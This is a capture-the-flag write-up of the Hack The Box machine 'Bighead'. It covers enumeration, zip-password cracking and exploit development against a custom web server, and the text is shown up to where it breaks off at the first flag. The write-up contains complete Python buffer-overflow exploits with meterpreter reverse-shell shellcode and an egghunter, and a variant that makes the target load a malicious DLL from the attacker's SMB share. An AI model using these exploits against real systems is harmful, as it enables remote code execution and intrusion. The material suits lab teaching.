---
layout: single
title: Bighead - Hack The Box
excerpt: "Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there's some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag."
date: 2019-05-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-bighead/bighead_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - exploit development
  - egghunter
  - asm
  - nginx
  - php
  - keepass
  - lfi
  - ntfs ads
  - enumeration
  - insane
  - windows
---

![](/assets/images/htb-writeup-bighead/bighead_logo.png)

Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there's some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag.

This box took the big part of my weekend when it came out but unfortunately I didn't keep detailed notes about everything. It was especially hard going back when doing this writeup and remember about the 418 status code and the registry key for the SSH password. Note to self: Always clean-up my notes after doing a box.

The exploit part is especially tricky since there isn't a lot of buffer space to work with so I had to put my second stage payload in memory first with a POST request then use an egghunter for the first stage payload. There's also another way to exploit this software without using an egghunter: We can use the `LoadLibrary` function to remotely load a .dll from our machine over SMB. I'll try to cover both in this blog post.

## Summary

- Find the `code.bighead.htb` sub-domain after dirbusting the main website
- Enumerate `code.bighead.htb`, find reference to `dev.bighead.htb` in one of the note file
- Find the BigheadWebSvr 1.0 webserver running by checking the `coffee` directory
- Search github and find that we can download the source code for the BigheadWebSvr webserver
- Analyse the binary and determine that it is vulnerable to a buffer overflow in HEAD requests
- Develop a working exploit locally on a 32 bits Windows 7 machine
- Adapt the exploit so it works through the Nginx reverse proxy
- Get a working reverse shell with the exploit and a metepreter payload
- Find a local SSH service listening on port 2020 then set up port forwarding to reach it
- Find the nginx SSH credentials by looking in the registry then log in to bvshell
- Find an LFI vulnerability in the Testlink application then use it to get a shell as NT AUTHORITY\SYSTEM
- Get the user.txt flag and find that the root.txt is accessible but contains a troll
- Notice that Keepass is installed and that the configuration file contains a keyfile name and database file of root.txt
- Find that there is an NTFS alternate data stream in the root.txt file that contains the hidden Keepass database file
- Download the admin.png keyfile, extract the hidden stream, extract the hash from the database file and crack it with John The Ripper
- Open the Keepass database file with the keyfile and password, then recover the root.txt hash from the database

## Tools used

- Immunity Debugger & x96dbg
- Metasploit
- keepass2john
- John The Ripper

### Portscan

There's a single port open and Nginx is listening on it:

```
# nmap -sC -sV -p- 10.10.10.112
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 21:03 EDT
Nmap scan report for bighead.htb (10.10.10.112)
Host is up (0.0076s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0
|_http-server-header: nginx/1.14.0
|_http-title: PiperNet Comes
```

### Website enumeration: bighead.htb

The main website is a company front page with a contact form at the bottom.

![](/assets/images/htb-writeup-bighead/webpage.png)

I tried checking the contact form for any stored XSS but I couldn't find any.

A quick scan with gobuster reveals interesting directories: `/backend` and `/updatecheck`

```
# gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://bighead.htb
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/Images (Status: 301)
/assets (Status: 301)
/backend (Status: 302)
/images (Status: 301)
/updatecheck (Status: 302)
```

`backend` simply redirects to `http://bighead.htb/BigHead` and returns a 404 error.

![](/assets/images/htb-writeup-bighead/404.png)

However `/updatecheck` redirects to `http://code.bighead.htb/phpmyadmin/phpinfo.php`, so I'll add that sub-domain to the list of stuff to enumerate.

![](/assets/images/htb-writeup-bighead/code.png)

After adding the sub-domain I can get to the page and it returns a `phpinfo()` output.

![](/assets/images/htb-writeup-bighead/phpadmin.png)

I know the box is running `Windows Server 2008` and that it's 32 bits.

### Website enumeration: code.bighead.htb

If I try to browse `http://code.bighead.htb/` I'm redirected to `http://code.bighead.htb/testlink/` which has another javascript redirect script to `http://127.0.0.1:5080/testlink/`.

Further enumeration with gobuster:
```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 25 -u http://code.bighead.htb | grep -vi index
2018/11/24 14:54:15 Starting gobuster

/images (Status: 301)
/img (Status: 301)
/assets (Status: 301)
/mail (Status: 301)
/dev (Status: 301)
/phpmyadmin (Status: 301)
/webalizer (Status: 301)
/dashboard (Status: 301)
/xampp (Status: 301)
/licenses (Status: 301)
/server-status (Status: 200)
/con (Status: 403)
/aux (Status: 403)
/error_log (Status: 403)
/prn (Status: 403)
/server-info (Status: 200)
```

A couple interesting directories like `phpmyadmin`, `dashboard` and `xampp` but the apps are broken by design and I can't do anything with them. I got some info about the server architecture from `http://code.bighead.htb/server-info?config` but that's about it:

```
Server Version: Apache/2.4.33 (Win32) OpenSSL/1.0.2o PHP/5.6.36
Server Architecture: 32-bit
```

It's interesting to note that the initial nmap scan found Nginx running on port 80 but here I have Apache running. That means Nginx is probably acting as a reverse proxy or load-balancer in front of Apache.

Next, I enumerated the `/testlink` directory I found earlier and got the following:

```
# gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://code.bighead.htb/testlink -s 200
/LICENSE (Status: 200)
/ChangeLog (Status: 200)
/Index (Status: 200)
/changelog (Status: 200)
/error (Status: 200)
/index (Status: 200)
/license (Status: 200)
/linkto (Status: 200)
/note (Status: 200)
/plugin (Status: 200)
[...]
```

The `note` file is very interesting as it contains a hint:

```
BIGHEAD! You F%*#ing R*#@*d!

STAY IN YOUR OWN DEV SUB!!!...

You have literally broken the code testing app and tools I spent all night building for Richard!

I don't want to see you in my code again!

Dinesh.
```

So Bighead broke the app and Dinesh is telling him to get his own **DEV** sub-domain, maybe I should check if `dev.bighead.htb` exists...

So after adding this sub-domain to the local hostfile, I can access a new page:

![](/assets/images/htb-writeup-bighead/bighead.png)

### Website enumeration: dev.bighead.htb

Anything that has the word `blog` and `wp-content` in it hits an nginx rule and returns a false positive for anything that contains that. I didn't find anything when I ran gobuster but dirb found the `/coffee` directory because it looks for more status codes by default.

```
# dirb http://dev.bighead.htb

GENERATED WORDS: 4612

---- Scanning URL: http://dev.bighead.htb/ ----
+ http://dev.bighead.htb/blog (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_ajax (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_inlinemod (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_report (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_search (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blog_usercp (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogger (CODE:302|SIZE:161)
+ http://dev.bighead.htb/bloggers (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogindex (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogs (CODE:302|SIZE:161)
+ http://dev.bighead.htb/blogspot (CODE:302|SIZE:161)
+ http://dev.bighead.htb/coffee (CODE:418|SIZE:46)
+ http://dev.bighead.htb/wp-content (CODE:302|SIZE:161)
```

The `/coffee` directory contains a funny teapot 418 error message.

![](/assets/images/htb-writeup-bighead/coffee.png)

I also see it's running a different webserver: `BigheadWebSvr 1.0`

```
# curl --head dev.bighead.htb/coffee
HTTP/1.1 200 OK
Date: Tue, 27 Nov 2018 02:20:48 GMT
Content-Type: text/html
Content-Length: 13456
Connection: keep-alive
Server: BigheadWebSvr 1.0
```

Google shows a github repository for that software: [https://github.com/3mrgnc3/BigheadWebSvr](https://github.com/3mrgnc3/BigheadWebSvr)

![](/assets/images/htb-writeup-bighead/git1.png)

I download `BHWS_Backup.zip` and saw that the zip file was encrypted. I can extract the hash and crack it with John:

```
# zip2john BHWS_Backup.zip > hash.txt
BHWS_Backup.zip->BHWS_Backup/ is not encrypted!
BHWS_Backup.zip->BHWS_Backup/conf/ is not encrypted!
# cat hash.txt
BHWS_Backup.zip:$zip2$*0*3*0*231ffea3729caa2f37a865b0dca373d7*d63f*49*61c6e7d2949fb22573c57dec460346954bba23dffb11f1204d4a6bc10e91b4559a6b984884fcb376ea1e2925b127b5f6721c4ef486c481738b94f08ac09df30c30d2ae3eb8032c586f*28c1b9eb8b0e1769b4d3*$/zip2$:::::BHWS_Backup.zip
```

```
# john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
2 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s
3 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s
4 0g 0:00:00:00 DONE (2018-11-26 21:41) 0g/s 0p/s 0c/s 0C/s
thepiedpiper89   (BHWS_Backup.zip)
1 1g 0:00:00:00 DONE (2018-11-26 21:41) 100.0g/s 100.0p/s 100.0c/s 100.0C/s thepiedpiper89
Waiting for 3 children to terminate
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Password is : `thepiedpiper89`

The archive contains the following files:

```
-rw-r--r-- 1 root root   75 Jul 14  2018 BigheadWebSvr_exe_NOTICE.txt
drwx------ 2 root root 4096 Jul  2  2018 conf
-rw-r--r-- 1 root root 1103 Jun 23  2018 fastcgi.conf
-rw-r--r-- 1 root root 1032 Jun 23  2018 fastcgi_params
-rw-r--r-- 1 root root 2946 Jun 23  2018 koi-utf
-rw-r--r-- 1 root root 2326 Jun 23  2018 koi-win
-rw-r--r-- 1 root root 5265 Jun 23  2018 mime.types
-rw-r--r-- 1 root root 4523 Jul  2  2018 nginx.conf
-rw-r--r-- 1 root root  653 Jun 23  2018 scgi_params
-rw-r--r-- 1 root root  681 Jun 23  2018 uwsgi_params
-rw-r--r-- 1 root root 3736 Jun 23  2018 win-utf
```

The .exe in the archive was replaced with a note instead:

```
# cat BigheadWebSvr_exe_NOTICE.txt
I removed this vulnerable crapware from the archive

love
Gilfoyle... :D
```

The file history on Github shows an older copy of the zip file:

![](/assets/images/htb-writeup-bighead/git2.png)

I downloaded the file then tried to extract it but the password is not `thepiedpiper89`. I cracked the password again and found the older commit uses `bighead` as the archive password. After extracting the file I can see there is a `BigheadWebSvr.exe` binary in there instead of the note.

```
# ls -l
total 132
-rw-r--r-- 1 root root 28540 Jul  2 16:33 bHeadSvr.dll
drwx------ 2 root root  4096 Jul  2 19:56 BHWS_Backup
-rw-r--r-- 1 root root 51431 Jul  2 16:33 BigheadWebSvr.exe
drwx------ 2 root root  4096 Jul  2 19:57 conf
-rw-r--r-- 1 root root  1103 Jun 23 11:50 fastcgi.conf
-rw-r--r-- 1 root root  1032 Jun 23 11:50 fastcgi_params
-rw-r--r-- 1 root root  2946 Jun 23 11:50 koi-utf
-rw-r--r-- 1 root root  2326 Jun 23 11:50 koi-win
-rw-r--r-- 1 root root  5265 Jun 23 11:50 mime.types
-rw-r--r-- 1 root root  4523 Jul  2 15:34 nginx.conf
-rw-r--r-- 1 root root   653 Jun 23 11:50 scgi_params
-rw-r--r-- 1 root root   681 Jun 23 11:50 uwsgi_params
-rw-r--r-- 1 root root  3736 Jun 23 11:50 win-utf
```

```
# file BigheadWebSvr.exe 
BigheadWebSvr.exe: PE32 executable (console) Intel 80386, for MS Windows
```

There is also an nginx config file which shows the following interesting stuff:

```
location / {
			# Backend server to forward requests to/from
			proxy_pass          http://127.0.0.1:8008;
			proxy_cache_convert_head off;
			proxy_cache_key $scheme$proxy_host$request_uri$request_method;
			proxy_http_version  1.1;
			
			# adds gzip
			gzip_static on;		
		}

location /coffee {
			# Backend server to forward requests to/from
			#rewrite /coffee /teapot/ redirect;
			#return 418;
			proxy_pass          http://127.0.0.1:8008;
			proxy_cache_convert_head off;
			proxy_intercept_errors off;
			proxy_cache_key $scheme$proxy_host$request_uri$request_method;
			proxy_http_version  1.1;
			proxy_pass_header Server;
			# adds gzip
			gzip_static on;		
		}
```

So, both requests to `/` and `/coffee` on dev.bighead.htb are served by that crap custom webserver but only `/coffee` reveals the server header because of the `proxy_pass_header Server` config file.

### Exploit development (Method #1 using egghunter)

After opening the .exe file in IDA Free, I saw that the binary was compiled with Mingw. From what I googled, none of the protections like DEP/NX are enabled by default when compiling with mingw so that should make exploitation easier.

![](/assets/images/htb-writeup-bighead/exploit/mingw.png)

The main function sets up up the socket listener and creates a `ConnectionHandler` thread when it receives a connection:

![](/assets/images/htb-writeup-bighead/exploit/connectionhandler.png)

The `ConnectionHandler` has multiple branches for the different HTTP methods. The `HEAD` request calls the `Function4` function.

![](/assets/images/htb-writeup-bighead/exploit/head.png)

![](/assets/images/htb-writeup-bighead/exploit/function4.png)

The function uses an insecure `strcpy` to move data around so it's possible there is a buffer overflow.

![](/assets/images/htb-writeup-bighead/exploit/strcpy.png)

I used the open-source [x32/64dbg](https://x64dbg.com/) debugger to debug the software.

I setup a breakpoint at the end of `Function4` just before it returns.

![](/assets/images/htb-writeup-bighead/exploit/breakpoint.png)

First, I test with a small payload that should not crash the server just to see if it catches the breakpoint and what the memory layout looks like.

`curl --head http://172.23.10.186:8008/AAAAAAAAAAAAAA`

The program stops at the breakpoint and `EAX` contains the memory address where the HEAD request is located.

![](/assets/images/htb-writeup-bighead/exploit/normal.png)

The memory at `0x175FB28` contains part of the HEAD request.

Next, I try sending 100 bytes and see if I can crash the program.

`curl --head http://172.23.10.186:8008/$(python -c 'print "A"*100')`

The program crashes, and I can see that the `EIP` register was overwritten by `AAAAAAAA` which is not a valid address here.

![](/assets/images/htb-writeup-bighead/exploit/crash.png)

Next I have to find the exact amount of data to push to overwrite EIP. After I few minutes I was able to find the exact offset:

`curl --head http://172.23.10.186:8008/$(python -c 'print(("A"*72)+("B"*8))')`

![](/assets/images/htb-writeup-bighead/exploit/offset.png)

I used mona in Immunity Debugger to confirm that no protection are enabled on `BigheadWebSvr.exe`

![](/assets/images/htb-writeup-bighead/exploit/protections.png)

Now I need to redirect the execution of the program to the `EAX` register value since this is where my payload will be located. I will use mona to look for gadgets in the program that I can use to jump to. Specifically, I'm looking for the memory address of a `JMP EAX` instruction.

![](/assets/images/htb-writeup-bighead/exploit/jmpeax.png)

I found a gadget at address `0x625012f2` in the bHeadSvr.dll. No protection is enabled on this DLL.

To test, I'll replace `BBBBBBBB` from my payload with the memory address of the `JMP EAX`. Notice the address is in the reverse order to respect the endianess.

`curl --head http://172.23.10.186:8008/$(python -c 'print(("A"*72)+("f2125062"))')`

After the function returns, the `EIP` points to the `JMP EAX` instruction.

![](/assets/images/htb-writeup-bighead/exploit/jmpeax2.png)

Then it jumps to the memory address of `EAX`. We see here we only have 36 bytes of buffer space to work with.

![](/assets/images/htb-writeup-bighead/exploit/jmpeax3.png)

I'll align the stack first by pushing and popping the `EAX` value into `ESP`. To find the opcode for this I used `nasm_shell.rb` from Metasploit:

```
# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

Edit: In retrospect I don't this part was required for this exploit, the exploit should have worked anyways because it doesn't push/pop stuff off the stack.

Since I don't have much buffer space to work with I'll use a 32 bytes egghunter. Basically the egghunter is a small shellcode that looks for a marker (the egg) in memory and jumps to it when it finds it. This is the first stage of the exploit, the 2nd stage will be the rest of the shellcode we want to execute and we'll need to place it in memory with another HTTP request. Mona can generate the code for the egghunter. By default it uses the string `w00t` for the egg.

![](/assets/images/htb-writeup-bighead/exploit/egghunter.png)

The first stage payload is:
- Align stack
- Egghunter shellcode
- JMP EAX

The second stage payload is:
- w00tw00t (egg)
- meterpreter payload

The exploit tested locally on my Win7 VM is shown here:

```python
#!/usr/bin/python

from pwn import *

'''
# msfvenom -p windows/meterpreter/reverse_tcp -b \x00\x0a\x0d -f python LHOST=172.23.10.39 LPORT=80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1772 bytes
'''

egg = "\x77\x30\x30\x74" # w00t
payload = egg + egg
payload += "\xbf\x33\x30\xf9\x54\xdd\xc2\xd9\x74\x24\xf4\x5a\x29"
payload += "\xc9\xb1\x56\x31\x7a\x13\x83\xea\xfc\x03\x7a\x3c\xd2"
payload += "\x0c\xa8\xaa\x90\xef\x51\x2a\xf5\x66\xb4\x1b\x35\x1c"
payload += "\xbc\x0b\x85\x56\x90\xa7\x6e\x3a\x01\x3c\x02\x93\x26"
payload += "\xf5\xa9\xc5\x09\x06\x81\x36\x0b\x84\xd8\x6a\xeb\xb5"
payload += "\x12\x7f\xea\xf2\x4f\x72\xbe\xab\x04\x21\x2f\xd8\x51"
payload += "\xfa\xc4\x92\x74\x7a\x38\x62\x76\xab\xef\xf9\x21\x6b"
payload += "\x11\x2e\x5a\x22\x09\x33\x67\xfc\xa2\x87\x13\xff\x62"
payload += "\xd6\xdc\xac\x4a\xd7\x2e\xac\x8b\xdf\xd0\xdb\xe5\x1c"
payload += "\x6c\xdc\x31\x5f\xaa\x69\xa2\xc7\x39\xc9\x0e\xf6\xee"
payload += "\x8c\xc5\xf4\x5b\xda\x82\x18\x5d\x0f\xb9\x24\xd6\xae"
payload += "\x6e\xad\xac\x94\xaa\xf6\x77\xb4\xeb\x52\xd9\xc9\xec"
payload += "\x3d\x86\x6f\x66\xd3\xd3\x1d\x25\xbb\x10\x2c\xd6\x3b"
payload += "\x3f\x27\xa5\x09\xe0\x93\x21\x21\x69\x3a\xb5\x30\x7d"
payload += "\xbd\x69\xfa\xee\x43\x8a\xfa\x27\x80\xde\xaa\x5f\x21"
payload += "\x5f\x21\xa0\xce\x8a\xdf\xaa\x58\x99\x08\xa1\xbf\x89"
payload += "\x34\xb5\xbf\x19\xb1\x53\xef\xc9\x91\xcb\x50\xba\x51"
payload += "\xbc\x38\xd0\x5e\xe3\x59\xdb\xb5\x8c\xf0\x34\x63\xe4"
payload += "\x6c\xac\x2e\x7e\x0c\x31\xe5\xfa\x0e\xb9\x0f\xfa\xc1"
payload += "\x4a\x7a\xe8\x36\x2d\x84\xf0\xc6\xd8\x84\x9a\xc2\x4a"
payload += "\xd3\x32\xc9\xab\x13\x9d\x32\x9e\x20\xda\xcd\x5f\x10"
payload += "\x90\xf8\xf5\x1c\xce\x04\x1a\x9c\x0e\x53\x70\x9c\x66"
payload += "\x03\x20\xcf\x93\x4c\xfd\x7c\x08\xd9\xfe\xd4\xfc\x4a"
payload += "\x97\xda\xdb\xbd\x38\x25\x0e\xbe\x3f\xd9\xcc\xe9\xe7"
payload += "\xb1\x2e\xaa\x17\x41\x45\x2a\x48\x29\x92\x05\x67\x99"
payload += "\x5b\x8c\x20\xb1\xd6\x41\x82\x20\xe6\x4b\x42\xfc\xe7"
payload += "\x78\x5f\x0f\x9d\xf1\x60\xf0\x62\x18\x05\xf1\x62\x24"
payload += "\x3b\xce\xb4\x1d\x49\x11\x05\x1a\x42\x24\x28\x0b\xc9"
payload += "\x46\x7e\x4b\xd8"

stage1 = "POST /coffee HTTP/1.1\r\n"
stage1 += "Host: dev.bighead.htb\r\n"
stage1 += "Content-Length: {}\r\n\r\n".format(len(payload))
stage1 += payload + "\r\n"
stage1 += "\r\n"

r = remote('172.23.10.186', 8008)
r.send(stage1)
r.recv()

r = remote('172.23.10.186', 8008)
jmp_eax = "f2125062"
align_esp = "505C" # push eax, pop esp
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7"
stage2 = align_esp + egghunter + "9090" + jmp_eax

r.send("HEAD /" + stage2 + " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n")
```

When the egghunter is scanning memory, CPU usage goes to 100% for a few seconds.

![](/assets/images/htb-writeup-bighead/exploit/cpu.png)

When it hits the egg, it executes the meterpreter stager and we get a connection:

```
msf5 exploit(multi/handler) > [*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (179808 bytes) to 172.23.10.186
[*] Meterpreter session 1 opened (172.23.10.39:80 -> 172.23.10.186:49804) at 2019-05-03 19:37:47 -0400

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...
```

Nice, the exploit works locally.

But when I tried running it against Bighead it didn't work so I replicated the nginx setup locally in Win7 and found that the second stage shellcode was being URL encoded by nginx. To work around this I had to fix the POST request and remove the `Content-Type` header so it would not URL encode the payload then switch the content body to the raw shellcode (non URL-encoded).

The final exploit looks like this:

```python
#!/usr/bin/python

from pwn import *
import requests

'''
# msfvenom -p windows/meterpreter/reverse_tcp -b \x00\x0a\x0d -f python LHOST=10.10.14.23 LPORT=80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1772 bytes
'''

egg = "\x77\x30\x30\x74" # w00t
payload = egg + egg
payload += "\xb8\xc3\x06\x6e\xa1\xd9\xcd\xd9\x74\x24\xf4\x5f\x2b"
payload += "\xc9\xb1\x56\x83\xef\xfc\x31\x47\x0f\x03\x47\xcc\xe4"
payload += "\x9b\x5d\x3a\x6a\x63\x9e\xba\x0b\xed\x7b\x8b\x0b\x89"
payload += "\x08\xbb\xbb\xd9\x5d\x37\x37\x8f\x75\xcc\x35\x18\x79"
payload += "\x65\xf3\x7e\xb4\x76\xa8\x43\xd7\xf4\xb3\x97\x37\xc5"
payload += "\x7b\xea\x36\x02\x61\x07\x6a\xdb\xed\xba\x9b\x68\xbb"
payload += "\x06\x17\x22\x2d\x0f\xc4\xf2\x4c\x3e\x5b\x89\x16\xe0"
payload += "\x5d\x5e\x23\xa9\x45\x83\x0e\x63\xfd\x77\xe4\x72\xd7"
payload += "\x46\x05\xd8\x16\x67\xf4\x20\x5e\x4f\xe7\x56\x96\xac"
payload += "\x9a\x60\x6d\xcf\x40\xe4\x76\x77\x02\x5e\x53\x86\xc7"
payload += "\x39\x10\x84\xac\x4e\x7e\x88\x33\x82\xf4\xb4\xb8\x25"
payload += "\xdb\x3d\xfa\x01\xff\x66\x58\x2b\xa6\xc2\x0f\x54\xb8"
payload += "\xad\xf0\xf0\xb2\x43\xe4\x88\x98\x0b\xc9\xa0\x22\xcb"
payload += "\x45\xb2\x51\xf9\xca\x68\xfe\xb1\x83\xb6\xf9\xc0\x84"
payload += "\x48\xd5\x6a\xc4\xb6\xd6\x8a\xcc\x7c\x82\xda\x66\x54"
payload += "\xab\xb1\x76\x59\x7e\x2f\x7d\xcd\x8b\xa5\x8f\x1a\xe4"
payload += "\xbb\x8f\x24\xa4\x32\x69\x74\x14\x14\x26\x35\xc4\xd4"
payload += "\x96\xdd\x0e\xdb\xc9\xfe\x30\x36\x62\x94\xde\xee\xda"
payload += "\x01\x46\xab\x91\xb0\x87\x66\xdc\xf3\x0c\x82\x20\xbd"
payload += "\xe4\xe7\x32\xaa\x92\x07\xcb\x2b\x37\x07\xa1\x2f\x91"
payload += "\x50\x5d\x32\xc4\x96\xc2\xcd\x23\xa5\x05\x31\xb2\x9f"
payload += "\x7e\x04\x20\x9f\xe8\x69\xa4\x1f\xe9\x3f\xae\x1f\x81"
payload += "\xe7\x8a\x4c\xb4\xe7\x06\xe1\x65\x72\xa9\x53\xd9\xd5"
payload += "\xc1\x59\x04\x11\x4e\xa2\x63\x21\x89\x5c\xf1\x0e\x32"
payload += "\x34\x09\x0f\xc2\xc4\x63\x8f\x92\xac\x78\xa0\x1d\x1c"
payload += "\x80\x6b\x76\x34\x0b\xfa\x34\xa5\x0c\xd7\x99\x7b\x0c"
payload += "\xd4\x01\x8c\x77\x95\xb6\x6d\x88\xbf\xd2\x6e\x88\xbf"
payload += "\xe4\x53\x5e\x86\x92\x92\x62\xbd\xad\xa1\xc7\x94\x27"
payload += "\xc9\x54\xe6\x6d"

data = {"payload": payload}
proxies = {"http": "http://127.0.0.1:8080"}

s = requests.Session()
r = requests.Request("POST", "http://dev.bighead.htb/coffee/", data=data)
p = r.prepare()
p.body = payload
del p.headers["Content-Type"]
try:
    s.send(p, proxies=proxies, timeout=0.2)
except requests.exceptions.ReadTimeout:
    pass

r = remote("10.10.10.112", 80)
jmp_eax = "f2125062"
align_esp = "505C" # push eax, pop esp
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7"
stage2 = align_esp + egghunter + "9090" + jmp_eax

r.send("HEAD /" + stage2 + " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n")
```

Launching exploit... 
```
# python exploit.py 
[+] Opening connection to 10.10.10.112 on port 80: Done
[*] Closed connection to 10.10.10.112 port 80

msf5 exploit(multi/handler) > 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (179808 bytes) to 10.10.10.112
[*] Meterpreter session 4 opened (10.10.14.23:80 -> 10.10.10.112:49306) at 2019-05-03 20:47:52 -0400

msf5 exploit(multi/handler) > 
msf5 exploit(multi/handler) > sessions 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: PIEDPIPER\Nelson
```

### Exploit development (Method #2 using LoadLibrary over SMB)

Instead of using an egghunter, we can also use the `LoadLibrary` function to load a remote DLL hosted on our machine through the Impacket SMB server. Using the debugger, I can see that the `LoadLibrary` is exported from `bheadsrv.dll` at address `0x625070C8`.

![](/assets/images/htb-writeup-bighead/exploit/loadlibrary.png)

The function is simple and only expects a single parameter: the filename of the DLL file:

```
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
```

The exploit uses the same `JMP EAX` gadget to jump to the beginning of the buffer. Then we align the stack, and set `EAX` past the buffer and we push it to the stack: this will contain the address of the string of our SMB server. Finally we move the address of `LoadLibrary` into `EBX` then `CALL EBX` to call the function. The filename argument for `LoadLibrary` is popped from the stack and the DLL is then loaded.

```
nasm > add al, 0x28
00000000  0428              add al,0x28

nasm > push eax
00000000  50                push eax

nasm > mov ebx, 0x62501B58
00000000  BB581B5062        mov ebx,0x62501b58

nasm > call ebx
00000000  FFD3              call ebx
```

The final exploit looks like this:

```python
#!/usr/bin/python
from pwn import *
import binascii

r = remote("10.10.10.112", 80)

load_lib = ""
load_lib += "\x80\x04\x28"         # add ah, 28h
load_lib += "\x50"                 # push eax
load_lib += "\xBB\x58\x1B\x50\x62" # 62501B58 ebx -> LoadLibrary
load_lib += "\xFF\xD3"             # call ebx

smb =  "\\\\10.10.14.23\\share\\x.dll"
load_lib = binascii.hexlify(load_lib)
smb = binascii.hexlify(smb)

jmp_eax = "f2125062"
align_esp = "505C" # push eax, pop esp
buf =  align_esp + load_lib + "90" * 24 + jmp_eax + smb
head = "HEAD /" + buf + " HTTP/1.1\r\n"
head += "Host: dev.bighead.htb\r\n"
head += "Connection: close\r\n"
head += "\r\n"
r.send(head)
r.close()
```

This makes the server download a .dll from my box and execute it. So I can generate a malicious DLL with msfvenom and have the server fetch it to give me a reverse shell:

```
# msfvenom -p windows/meterpreter/reverse_tcp -o x.dll -f dll LHOST=10.10.14.23 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of dll file: 5120 bytes
Saved as: x.dll
```

Because the server uses SMB to talk back to us, we'll start an SMB share with Impacket:

```
# /usr/share/doc/python-impacket/examples/smbserver.py share .
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Firing up the exploit...

```
# python smbexploit.py 
191
HEAD /505C042850bb581b5062ffd3909090909090909090909090909090909090909090909090f21250625c5c31302e31302e31342e32335c73686172655c782e646c6c HTTP/1.1
Host: dev.bighead.htb
Connection: close
...
[*] Incoming connection (10.10.10.112,60888)
[*] AUTHENTICATE_MESSAGE (PIEDPIPER\Nelson,PIEDPIPER)
[*] User Nelson\PIEDPIPER authenticated successfully
[*] Nelson::PIEDPIPER:4141414141414141:e8e4ea60eb43ad439299c50c245654ca:010100000000000000f1a060fc85d4017e4c61f17754814500000000010010004f00650051004a00490073005600450002001000730047006b007400540068006f005600030010004f00650051004a00490073005600450004001000730047006b007400540068006f0056000700080000f1a060fc85d40106000400020000000800300030000000000000000000000000200000282e2960465001d017bb89eae52e3c9002f1edefda8c004fd0186e57fb9bd3eb000000000000000000000000
[*] Disconnecting Share(1:IPC$)
...
msf exploit(multi/handler) > [*] Sending stage (179779 bytes) to 10.10.10.112
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.112:60889) at 2018-11-26 21:53:32 -0500

msf exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: PIEDPIPER\Nelson
```

### Windows enumeration

Now that I finally have a shell, I tried to get `user.txt` but this version is just a troll:

```
meterpreter > cat /users/nelson/desktop/user.txt

    .-''-.  .-------.      .---.    .-./`)     _______   .---.  .---.         
  .'_ _   \ |  _ _   \     | ,_|    \ .-.')   /   __  \  |   |  |_ _|         
